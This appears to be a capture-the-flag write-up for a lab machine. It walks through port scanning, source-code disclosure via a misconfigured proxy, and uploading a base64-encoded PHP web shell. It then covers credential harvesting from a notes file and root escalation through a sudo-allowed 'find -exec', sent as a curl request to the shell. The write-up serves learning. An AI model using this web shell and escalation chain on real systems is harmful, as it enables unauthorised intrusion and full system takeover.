<img width="503" height="637" alt="image" src="https://github.com/user-attachments/assets/083b9dc8-5352-49e0-b090-10565f4a93b6" />

**Objective:** Obtain the user flag (`user.txt`)

## 1. Information Gathering & Reconnaissance

### Network Scanning

The attack began with an **Nmap** scan to identify open ports and services:

```jsx
sudo nmap -sC -sV -p- -T4 192.168.56.101
```

<img width="797" height="398" alt="image" src="https://github.com/user-attachments/assets/3939ec81-6d98-45f7-a985-bc5f85a0f417" />

**Key Results:**

- **Port 80 (Apache):** Hosting a "Freshman Portal" login page.
- **Port 21 (FTP):** Open, but anonymous login was disabled.
- **Port 8080 (Nginx):** A secondary web server.
- **Port 3306 (MySQL):** Database service (locally restricted).

### Web Enumeration

Initial inspection of **Port 80** revealed a login portal. Directory brute-forcing with **Gobuster** identified an `/upload.php` page and an `/uploads` directory, but access was restricted to authenticated users.

<img width="816" height="680" alt="image" src="https://github.com/user-attachments/assets/40042b49-ed4f-4448-8b9a-6016801e016b" />

## 2. Vulnerability Analysis & Foothold

### Source Code Disclosure (Port 8080)

While Port 80 was hardened with **Kaspersky Antivirus**, Port 8080 was discovered to be an improperly configured Nginx proxy. By using the proxy to request local files, the server returned the raw PHP source code instead of executing it:

<img width="951" height="671" alt="image" src="https://github.com/user-attachments/assets/dd97ae7b-832a-4d1f-95a0-e1fb54ff6b51" />

**Finding:** The source code revealed hardcoded credentials for the portal:

- **Username:** `admin`
- **Password:** `admin`

### Exploitation: Arbitrary File Upload

Using the discovered credentials, I logged into the portal on Port 80. The portal contained an "Assignment Upload" feature.

1. Created a PHP web shell (`cmd.php`): `PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+`.

<img width="799" height="533" alt="image" src="https://github.com/user-attachments/assets/72a568f9-75ca-4d56-a50e-506abdd62e64" />

1. Uploaded the shell through the portal.
2. Verified Remote Code Execution (RCE) by navigating to:
`http://192.168.56.101/uploads/cmd.php?cmd=id`**Result:** `uid=33(www-data) gid=33(www-data)`

<img width="458" height="83" alt="image" src="https://github.com/user-attachments/assets/739b67c1-32ff-478c-9de7-f1ec31c35ded" />

## 3. Post-Exploitation & Lateral Movement

### System Enumeration

As the `www-data` user, access to the target user's home directory (`/home/freshman`) was denied due to strict Linux permissions (700). I began searching world-writable directories for clues:

<img width="554" height="149" alt="image" src="https://github.com/user-attachments/assets/4c2834da-c59f-4c65-b96c-041b55628ba3" />

**Finding:** A file named `dev_notes.txt` was discovered in `/tmp`.

<img width="554" height="463" alt="image" src="https://github.com/user-attachments/assets/ac020f41-09e1-4f02-8a8c-e6b10e9ffaa8" />

### Credential Harvesting

Reading `/tmp/dev_notes.txt` revealed a critical developer oversight:

> **Test Accounts (REMOVE BEFORE PRODUCTION!):** > SSH Access -> `freshman` / `freshman123`
> 
> 
<img width="550" height="424" alt="image" src="https://github.com/user-attachments/assets/6f9ae56a-5f16-4a20-90bd-c689e73d65e1" />
> 

## 4. Capturing the Flag

### Gaining User Access

Using the leaked credentials, I authenticated via **FTP** (Port 21) as the user `freshman`:

`ftp 192.168.56.101
# User: freshman | Pass: freshman123`

### Retrieving the Flag

Inside the home directory, I located `user.txt`. Since FTP is for transfer and not viewing, I downloaded the file to my local machine:

Code snippet

`ftp> get user.txt`

**Decoding the Flag:**
The file contained a Base64 string: `aGFjazEwezNhc3lfcDNhc3lfMW4xdDFhbF9hY2Mzc3N9Cg==`


## Horizontal Movement (`www-data` → `freshman`)

Because the target did not have **SSH (Port 22)** open, the `freshman` credentials had to be used internally. Using the existing web shell, a command was crafted to switch users and verify permissions.

### Checking Sudo Capabilities

The `sudo -l` command was executed by piping the password into `su` to bypass the interactive terminal requirement:

<img width="981" height="141" alt="image" src="https://github.com/user-attachments/assets/c4830a49-8c66-453a-ba63-8d878b8e8c35" />

```jsx
User freshman may run the following commands on Hack10-Freshman-V2:
    (ALL) NOPASSWD: /usr/bin/find
```

This confirmed that the `freshman` user could run the `find` binary with **Root** privileges without a password.

## 3. Vertical Movement (`freshman` → `root`)

### Exploiting the `find` Binary

The `find` utility includes an `-exec` flag that allows the execution of arbitrary system commands. Since the binary was allowed to run via `sudo`, any command passed to `-exec` would run with **root** authority.

### The Root Exploit Command

A final "Inception" command was sent via the web shell. It authenticated as `freshman`, invoked `sudo find`, and used the `-exec` flag to read the protected root flag:

```jsx
curl "http://192.168.56.101/uploads/cmd.php?cmd=echo%20'freshman123'%20|%20su%20freshman%20-c%20'sudo%20/usr/bin/find%20/etc/passwd%20-exec%20cat%20/root/root.txt%20%5C%3B'"
```

<img width="987" height="82" alt="image" src="https://github.com/user-attachments/assets/4d3401be-d8b1-4280-ad9d-651c7926956a" />

Note: `/etc/passwd` was used as the search target to ensure `find` matched exactly one file, triggering the `cat` command only once.

## 4. Final Flag Capture

The command returned a Base64 encoded string:
`aGFjazEwe3IwMHRfcHIxdjNzY192MWFfczB1ZDBfZjFuZF93MDB0fQo=`

<img width="657" height="67" alt="image" src="https://github.com/user-attachments/assets/dcc6ceeb-a981-4650-b5c7-35d786b3265d" />

**Root Flag:** `hack10{r00t_pr1v3sc_v1a_s0ud0_f1nd_w00t}`
